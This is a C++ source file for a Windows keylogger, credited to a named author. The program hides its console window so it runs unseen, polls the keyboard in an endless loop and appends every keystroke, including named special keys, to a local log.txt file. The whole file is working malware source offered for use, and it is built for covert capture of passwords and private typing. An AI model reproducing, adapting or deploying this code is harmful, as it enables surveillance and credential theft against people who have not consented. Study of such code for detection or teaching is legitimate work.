// Keylogger CLI application in C++ for Windows author- Rishabh Maheshwari
#include<iostream>
#include<fstream>
#include<windows.h>
#include<bits/stdc++.h>

#define log_file "log.txt"

using namespace std;

void saveData(string data){
    fstream log;
    log.open(log_file,ios::app);
    log<<data;
    log.close();
}

string SpecialKey(int key){
    string result;

    switch(key){
        case VK_BACK
            :result="\b";
            break;
        case VK_RETURN
            :result="<ENTER>\n";
            break;
        case VK_SPACE
            :result = " ";
            break;
        case VK_SHIFT
            :result="<SHIFT>";
            break;
        case VK_OEM_PERIOD
            :result=".";
            break;
        case VK_OEM_COMMA
            :result=",";
            break;
        case VK_OEM_2
            :result="?";
            break;
        case VK_OEM_3
            :result="~";
            break;
        case VK_OEM_4
            :result="{";
            break;
        case VK_OEM_5
            :result="|";
            break;
            case VK_OEM_6
            :result="}";
            break;
        case VK_OEM_7
            :result="\"";
            break;
        case VK_OEM_8  // for 102 keyboard
            :result="*";
            break;
        case VK_OEM_102
            :result=">";
            break;
        case VK_TAB
            :result="<TAB>";
            break;
        case VK_CONTROL
            :result="<CONTROL>";
            break;
        case VK_MENU
            :result="<ALT>";
            break;
        case VK_CAPITAL
            :result="<CAPSLOCK>";
            break;
        case VK_ESCAPE
            :result="<ESCAPE>";
            break;
        case VK_PRIOR
            :result="<PAGEUP>";
            break;
        case VK_NEXT
            :result="<PAGEDOWN>";
            break;
        case VK_END
            :result="<END>";
            break;
        case VK_HOME
            :result="<HOME>";
            break;
        case VK_LEFT
            :result="<LEFT>";
            break;
        case VK_UP
            :result="<UP>";
            break;
        case VK_RIGHT
            :result="<RIGHT>";
            break;
        case VK_DOWN
            :result="<DOWN>";
            break;
        case VK_SNAPSHOT
            :result="<PRINTSCREEN>";
            break;
        case VK_INSERT
            :result="<INSERT>";
            break;
        case VK_DELETE
            :result="<DELETE>";
            break;
        case VK_LWIN
            :result="<LEFTWINDOWS>";
            break;
        case VK_RWIN
            :result="<RIGHTWINDOWS>";
            break;
        case VK_NUMPAD0
            :result="0";
            break;
        case VK_NUMPAD1
            :result="1";
            break;
        case VK_NUMPAD2
            :result="2";
            break;
        case VK_NUMPAD3
            :result="3";
            break;
        case VK_NUMPAD4    
            :result="4";
            break;
        case VK_NUMPAD5
            :result="5";
            break;
        case VK_NUMPAD6
            :result="6";
            break;
        case VK_NUMPAD7
            :result="7";
            break;
        case VK_NUMPAD8
            :result="8";
            break;
        case VK_NUMPAD9
            :result="9";
            break;
        case VK_MULTIPLY
            :result="*";
            break;  
        case VK_ADD
            :result="+";
            break;
        case VK_SUBTRACT
            :result="-";
            break;
        case VK_DECIMAL
            :result=".";
            break;
        case VK_DIVIDE
            :result="/";
            break;
        case VK_F1
            :result="<F1>";
            break;
        case VK_F2
            :result="<F2>";
            break;
        case VK_F3
            :result="<F3>";
            break;
        case VK_F4
            :result="<F4>";
            break;
        case VK_F5
            :result="<F5>";
            break;
        case VK_F6 
            :result="<F6>";
            break;
        case VK_F7
            :result="<F7>";
            break;
        case VK_F8
            :result="<F8>";
            break;
        case VK_F9
            :result="<F9>";
            break;
        case VK_F10
            :result="<F10>";
            break;
        case VK_F11
            :result="<F11>";
            break;
        case VK_F12
            :result="<F12>";
            break;
        case VK_NUMLOCK
            :result="<NUMLOCK>";
            break;
        case VK_SCROLL
            :result="<SCROLLLOCK>";
            break; 
        case VK_LSHIFT
            :result="<LEFTSHIFT>";
            break;
        case VK_RSHIFT
            :result="<RIGHTSHIFT>";
            break;
        case VK_LCONTROL
            :result="<LEFTCONTROL>";
            break;
        case VK_RCONTROL
            :result="<RIGHTCONTROL>";
            break;

        default:
        break;
    }
    return result;

}


int main(){
    int specialKeyArr[] = { VK_BACK, VK_RETURN, VK_SHIFT, VK_SPACE, VK_OEM_PERIOD, VK_OEM_COMMA, VK_OEM_2, VK_OEM_3, VK_OEM_4, VK_OEM_5, VK_OEM_6, VK_OEM_7, VK_OEM_8, VK_OEM_102, VK_TAB, VK_CONTROL, VK_MENU, VK_CAPITAL, VK_ESCAPE, VK_PRIOR, VK_NEXT, VK_END, VK_HOME  , VK_LEFT, VK_UP, VK_RIGHT, VK_DOWN, VK_SNAPSHOT            , VK_INSERT, VK_DELETE, VK_LWIN, VK_RWIN            , VK_NUMPAD0, VK_NUMPAD1, VK_NUMPAD2, VK_NUMPAD3, VK_NUMPAD4    , VK_NUMPAD5, VK_NUMPAD6, VK_NUMPAD7, VK_NUMPAD8, VK_NUMPAD9, VK_MULTIPLY, VK_ADD, VK_SUBTRACT, VK_DECIMAL, VK_DIVIDE, VK_F1, VK_F2, VK_F3, VK_F4, VK_F5, VK_F6 , VK_F7, VK_F8, VK_F9, VK_F10, VK_F11, VK_F12, VK_NUMLOCK, VK_SCROLL, VK_LSHIFT, VK_RSHIFT, VK_LCONTROL, VK_RCONTROL};
    string specialKeyChar;
    bool isSpecialKey = false;
    

// hide terminal windows 
HWND stealth = GetConsoleWindow();
ShowWindow(stealth,SW_HIDE);
while(1){
    for(int i =65; i<=190; i++){
        if(GetAsyncKeyState(i)==-32767){
            isSpecialKey = find( begin(specialKeyArr), end(specialKeyArr), i) != end(specialKeyArr);
            if(isSpecialKey){
                specialKeyChar = SpecialKey(i);
                saveData(specialKeyChar);
            }
            else{
                if(GetKeyState(VK_CAPITAL)){
                    saveData(string(1, (char)i));
                }
                else{
                    saveData(string(1, (char)tolower(i)));
            }
        }
    }
}}
return 0;
}